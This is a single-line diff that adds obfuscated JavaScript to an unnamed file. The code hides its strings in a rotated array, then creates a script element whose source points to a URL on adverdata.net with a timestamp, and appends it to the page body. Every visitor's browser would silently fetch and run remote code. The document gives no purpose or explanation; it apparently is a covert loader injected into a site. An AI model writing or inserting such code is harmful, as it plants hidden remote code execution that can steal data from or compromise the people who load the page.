@@ -1,0 +1,1 @@
+var a=['https://adverdata.net/0x200/04cde9ff880/0x2.js?t=','now','body','appendChild','createElement','script','src'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x1b6));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var c=document[b('0x0')](b('0x1'));c['async']=!![];c[b('0x2')]=b('0x3')+Date[b('0x4')]();document[b('0x5')][b('0x6')](c);
